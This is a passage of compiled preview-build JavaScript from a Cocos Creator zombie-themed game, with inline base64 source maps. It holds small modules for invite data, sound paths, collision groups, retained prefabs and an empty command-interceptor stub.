ywwQkFBTSxHQUFOO1FBQ0ksSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsSUFBSSxDQUFDLFdBQVcsRUFBRSxJQUFJLENBQUMsQ0FBQztJQUNsRSxDQUFDO0lBRUQsK0JBQVcsR0FBWCxVQUFZLEtBQUs7UUFDYixFQUFFLENBQUMsU0FBUyxDQUFDLFlBQVksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLGFBQWEsRUFBRSxLQUFLLENBQUMsQ0FBQztRQUNoRSxJQUFJLElBQUksQ0FBQyxJQUFJLEVBQUM7WUFDVixJQUFJLENBQUMsUUFBUSxFQUFFLENBQUM7WUFDaEIsSUFBSSxDQUFDLE9BQU8sRUFBRSxDQUFDO1NBQ2xCO0lBQ0wsQ0FBQztJQUVELDRCQUFRLEdBQVI7UUFDSSxJQUFJLENBQUMsSUFBSSxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxJQUFJLENBQUMsV0FBVyxFQUFFLElBQUksQ0FBQyxDQUFDO0lBQ25FLENBQUM7SUFHRCw2QkFBUyxHQUFUO1FBQ0ksSUFBSSxDQUFDLFFBQVEsRUFBRSxDQUFDO0lBQ3BCLENBQUM7SUEzQkQ7UUFEQyxRQUFROzJDQUNJO0lBR2I7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxhQUFhLENBQUMsRUFBRSxXQUFXLEVBQUMsTUFBTSxFQUFDLENBQUM7Z0RBQ1Y7SUFHbEQ7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxZQUFZLEVBQUUsV0FBVyxFQUFDLE1BQU0sRUFBQyxDQUFDO29EQUNoQjtJQVQ5QixTQUFTO1FBRjdCLE9BQU87UUFDUCxJQUFJLENBQUMsZUFBZSxDQUFDO09BQ0QsU0FBUyxDQStCN0I7SUFBRCxnQkFBQztDQS9CRCxBQStCQyxDQS9Cc0MsRUFBRSxDQUFDLFNBQVMsR0ErQmxEO2tCQS9Cb0IsU0FBUyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eSwgbWVudX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuZW51bSBOb2RlRXZlbnRUeXBle1xyXG4gICAgVE9VQ0hfU1RBUlQsXHJcbiAgICBUT1VDSF9NT1ZFLFxyXG4gICAgVE9VQ0hfRU5ELFxyXG4gICAgVE9VQ0hfQ0FOQ0VMLFxyXG4gICAgTU9VU0VfRE9XTixcclxuICAgIE1PVVNFX01PVkUsXHJcbiAgICBNT1VTRV9FTlRFUixcclxuICAgIE1PVVNFX0xFQVZFLFxyXG4gICAgTU9VU0VfVVAsXHJcbiAgICBNT1VTRV9XSEVFTCxcclxuICAgIFBPU0lUSU9OX0NIQU5HRUQsXHJcbiAgICBST1RBVElPTl9DSEFOR0VELFxyXG4gICAgU0NBTEVfQ0hBTkdFRCxcclxuICAgIFNJWkVfQ0hBTkdFRCxcclxuICAgIEFOQ0hPUl9DSEFOR0VELFxyXG4gICAgQ0hJTERfQURERUQsXHJcbiAgICBDSElMRF9SRU1PVkVELFxyXG4gICAgQ0hJTERfUkVPUkRFUixcclxuICAgIEdST1VQX0NIQU5HRUQsXHJcbn1cclxuXHJcbmxldCBtYXAgPSBuZXcgTWFwPE5vZGVFdmVudFR5cGUsIHN0cmluZz4oKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLlRPVUNIX1NUQVJULCBjYy5Ob2RlLkV2ZW50VHlwZS5UT1VDSF9TVEFSVCk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5UT1VDSF9NT1ZFLCBjYy5Ob2RlLkV2ZW50VHlwZS5UT1VDSF9NT1ZFKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLlRPVUNIX0VORCwgY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfRU5EKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLlRPVUNIX0NBTkNFTCwgY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfQ0FOQ0VMKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLk1PVVNFX0RPV04sIGNjLk5vZGUuRXZlbnRUeXBlLk1PVVNFX0RPV04pO1xyXG5tYXAuc2V0KE5vZGVFdmVudFR5cGUuTU9VU0VfTU9WRSwgY2MuTm9kZS5FdmVudFR5cGUuTU9VU0VfTU9WRSk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5NT1VTRV9FTlRFUiwgY2MuTm9kZS5FdmVudFR5cGUuTU9VU0VfRU5URVIpO1xyXG5tYXAuc2V0KE5vZGVFdmVudFR5cGUuTU9VU0VfTEVBVkUsIGNjLk5vZGUuRXZlbnRUeXBlLk1PVVNFX0xFQVZFKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLk1PVVNFX1VQLCBjYy5Ob2RlLkV2ZW50VHlwZS5NT1VTRV9VUCk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5NT1VTRV9XSEVFTCwgY2MuTm9kZS5FdmVudFR5cGUuTU9VU0VfV0hFRUwpO1xyXG5tYXAuc2V0KE5vZGVFdmVudFR5cGUuUE9TSVRJT05fQ0hBTkdFRCwgY2MuTm9kZS5FdmVudFR5cGUuUE9TSVRJT05fQ0hBTkdFRCk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5TQ0FMRV9DSEFOR0VELCBjYy5Ob2RlLkV2ZW50VHlwZS5TQ0FMRV9DSEFOR0VEKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLkFOQ0hPUl9DSEFOR0VELCBjYy5Ob2RlLkV2ZW50VHlwZS5BTkNIT1JfQ0hBTkdFRCk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5DSElMRF9BRERFRCwgY2MuTm9kZS5FdmVudFR5cGUuQ0hJTERfQURERUQpO1xyXG5tYXAuc2V0KE5vZGVFdmVudFR5cGUuQ0hJTERfUkVNT1ZFRCwgY2MuTm9kZS5FdmVudFR5cGUuQ0hJTERfUkVNT1ZFRCk7XHJcbm1hcC5zZXQoTm9kZUV2ZW50VHlwZS5DSElMRF9SRU9SREVSLCBjYy5Ob2RlLkV2ZW50VHlwZS5DSElMRF9SRU9SREVSKTtcclxubWFwLnNldChOb2RlRXZlbnRUeXBlLkdST1VQX0NIQU5HRUQsIGNjLk5vZGUuRXZlbnRUeXBlLkdST1VQX0NIQU5HRUQpO1xyXG5cclxuXHJcbkBjY2NsYXNzXHJcbkBtZW51KFwi6Ieq5a6a5LmJL05vZGVFdmVudFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBOb2RlRXZlbnQgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgb25jZSA9IGZhbHNlO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5FbnVtKE5vZGVFdmVudFR5cGUpLCBkaXNwbGF5TmFtZTpcIuS6i+S7tuexu+Wei1wifSlcclxuICAgIGV2ZW50VHlwZTpOb2RlRXZlbnRUeXBlID0gTm9kZUV2ZW50VHlwZS5UT1VDSF9FTkQ7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIsIGRpc3BsYXlOYW1lOlwi6Kem5Y+R5LqL5Lu2XCJ9KVxyXG4gICAgZXZlbnRIYW5kbGVyczpbY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlcl0gPSBbXTtcclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihtYXAuZ2V0KHRoaXMuZXZlbnRUeXBlKSwgdGhpcy5vbk5vZGVFdmVudCwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25Ob2RlRXZlbnQoZXZlbnQpe1xyXG4gICAgICAgIGNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIuZW1pdEV2ZW50cyh0aGlzLmV2ZW50SGFuZGxlcnMsIGV2ZW50KTtcclxuICAgICAgICBpZiAodGhpcy5vbmNlKXtcclxuICAgICAgICAgICAgdGhpcy5vZmZFdmVudCgpO1xyXG4gICAgICAgICAgICB0aGlzLmRlc3Ryb3koKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb2ZmRXZlbnQoKXtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKG1hcC5nZXQodGhpcy5ldmVudFR5cGUpLCB0aGlzLm9uTm9kZUV2ZW50LCB0aGlzKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgb25EZXN0cm95KCl7XHJcbiAgICAgICAgdGhpcy5vZmZFdmVudCgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/InviteConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0b4bf370PJHSbsNEq/dqeAY', 'InviteConfig');
// script/app/config/InviteConfig.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.InviteConfig = void 0;
var InviteConfig = /** @class */ (function () {
    function InviteConfig() {
    }
    InviteConfig.datas = [
        { icon: "WhackZombies/001.jpg", title: "末日 废土 丧尸 和成为超级战士的你！" },
    ];
    return InviteConfig;
}());
exports.InviteConfig = InviteConfig;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9JbnZpdGVDb25maWcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQTtJQUFBO0lBSUEsQ0FBQztJQUhtQixrQkFBSyxHQUFHO1FBQ3BCLEVBQUMsSUFBSSxFQUFDLHNCQUFzQixFQUFFLEtBQUssRUFBQyxxQkFBcUIsRUFBQztLQUM3RCxDQUFDO0lBQ04sbUJBQUM7Q0FKRCxBQUlDLElBQUE7QUFKWSxvQ0FBWSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5leHBvcnQgY2xhc3MgSW52aXRlQ29uZmlnIHtcclxuICAgIHN0YXRpYyByZWFkb25seSBkYXRhcyA9IFtcclxuICAgICAgICB7aWNvbjpcIldoYWNrWm9tYmllcy8wMDEuanBnXCIsIHRpdGxlOlwi5pyr5pelIOW6n+WcnyDkuKflsLgg5ZKM5oiQ5Li66LaF57qn5oiY5aOr55qE5L2g77yBXCJ9LFxyXG4gICAgXTtcclxufSJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/CommandInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5db59EtNk5B6rnUA4Q97KNs', 'CommandInterceptor');
// framework/interceptor/CommandInterceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvQ29tbWFuZEludGVyY2VwdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG4vKipcclxuICog5ZG95Luk5oum5oiq5ZmoXHJcbiAqIOWPr+S7peaLpuaIqmNvbW1hbmTlkb3ku6TvvIzlnKjmiafooYxjb21tYW5k5LmL5YmN5oiW5LmL5ZCO5YGa5LiA5Lqb6Ieq5bex55qE5aSE55CG5bel5L2c77yM5q+U5aaC77yaXHJcbiAqIDEu5YiH5o2i6IOM5pmv6Z+z5LmQXHJcbiAqIDIu5paw5omL5byV5a+8XHJcbiAqIDMu5LyY5YyW5oCn6IO9KOaPkOWJjeWKoOi9vei1hOa6kClcclxuICogZXRjLlxyXG4gKiDlnKjkuI3kv67mlLnmuLjmiI/pgLvovpHnmoTku6PnoIHlrozmiJDov5nkupvlip/og73jgIJcclxuICogKi9cclxuXHJcbmV4cG9ydCBpbnRlcmZhY2UgSUNvbW1hbmRJbnRlcmNlcHRvcntcclxuICAgIHByZUhhbmRsZSguLi5hcmdzKTpQcm9taXNlPGJvb2xlYW4+O1xyXG4gICAgcG9zdEhhbmRsZShyZXM6YW55LCAuLi5hcmdzKTpQcm9taXNlO1xyXG59XHJcblxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/MusicPaths.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '191c6z1J6lMp4PCBdsWPXAH', 'MusicPaths');
// script/app/config/MusicPaths.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.MusicPaths = void 0;
var MusicPaths;
(function (MusicPaths) {
    MusicPaths["HomeBg"] = "sound/msc_fly";
    MusicPaths["GameBg"] = "sound/bgm";
    MusicPaths["ClickUI"] = "sound/ui_click";
})(MusicPaths = exports.MusicPaths || (exports.MusicPaths = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9NdXNpY1BhdGhzLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOzs7QUFHbkcsSUFBWSxVQUlYO0FBSkQsV0FBWSxVQUFVO0lBQ2xCLHNDQUF3QixDQUFBO0lBQ3hCLGtDQUFvQixDQUFBO0lBQ3BCLHdDQUEwQixDQUFBO0FBQzlCLENBQUMsRUFKVyxVQUFVLEdBQVYsa0JBQVUsS0FBVixrQkFBVSxRQUlyQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmV4cG9ydCBlbnVtIE11c2ljUGF0aHN7XHJcbiAgICBIb21lQmcgPSBcInNvdW5kL21zY19mbHlcIixcclxuICAgIEdhbWVCZyA9IFwic291bmQvYmdtXCIsXHJcbiAgICBDbGlja1VJID0gXCJzb3VuZC91aV9jbGlja1wiLFxyXG59Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/GroupConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a8411Y6H4RH8ILHau8poiNJ', 'GroupConfig');
// script/app/config/GroupConfig.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.GroupConfig = void 0;
var GroupConfig;
(function (GroupConfig) {
    GroupConfig["default"] = "default";
    GroupConfig["enemy"] = "enemy";
    GroupConfig["role"] = "role";
})(GroupConfig = exports.GroupConfig || (exports.GroupConfig = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9Hcm91cENvbmZpZy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7O0FBRW5HLElBQVksV0FJWDtBQUpELFdBQVksV0FBVztJQUNuQixrQ0FBbUIsQ0FBQTtJQUNuQiw4QkFBZSxDQUFBO0lBQ2YsNEJBQWEsQ0FBQTtBQUNqQixDQUFDLEVBSlcsV0FBVyxHQUFYLG1CQUFXLEtBQVgsbUJBQVcsUUFJdEIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcbmV4cG9ydCBlbnVtIEdyb3VwQ29uZmlnIHtcclxuICAgIGRlZmF1bHQgPSBcImRlZmF1bHRcIixcclxuICAgIGVuZW15ID0gXCJlbmVteVwiLFxyXG4gICAgcm9sZSA9IFwicm9sZVwiLFxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/ResConfig.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c07349DfYtOrKUAwEyz1xe/', 'ResConfig');
// script/app/config/ResConfig.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.ResConfig = void 0;
var ResConfig = /** @class */ (function () {
    function ResConfig() {
    }
    ResConfig.retainPrefabs = [
        "prefab/dialog",
        "prefab/separationLayer",
        "prefab/textTips",
    ];
    return ResConfig;
}());
exports.ResConfig = ResConfig;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9SZXNDb25maWcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQTtJQUFBO0lBT0EsQ0FBQztJQUxtQix1QkFBYSxHQUFHO1FBQzVCLGVBQWU7UUFDZix3QkFBd0I7UUFDeEIsaUJBQWlCO0tBQ3BCLENBQUM7SUFDTixnQkFBQztDQVBELEFBT0MsSUFBQTtBQVBZLDhCQUFTIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5leHBvcnQgY2xhc3MgUmVzQ29uZmlnIHtcclxuXHJcbiAgICBzdGF0aWMgcmVhZG9ubHkgcmV0YWluUHJlZmFicyA9IFtcclxuICAgICAgICBcInByZWZhYi9kaWFsb2dcIixcclxuICAgICAgICBcInByZWZhYi9zZXBhcmF0aW9uTGF5ZXJcIixcclxuICAgICAgICBcInByZWZhYi90ZXh0VGlwc1wiLFxyXG4gICAgXTtcclxufSJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/LocalStorageKeys.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c2610q2qXFMkpceJwMl/oK9', 'LocalStorageKeys');
// script/app/config/LocalStorageKeys.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
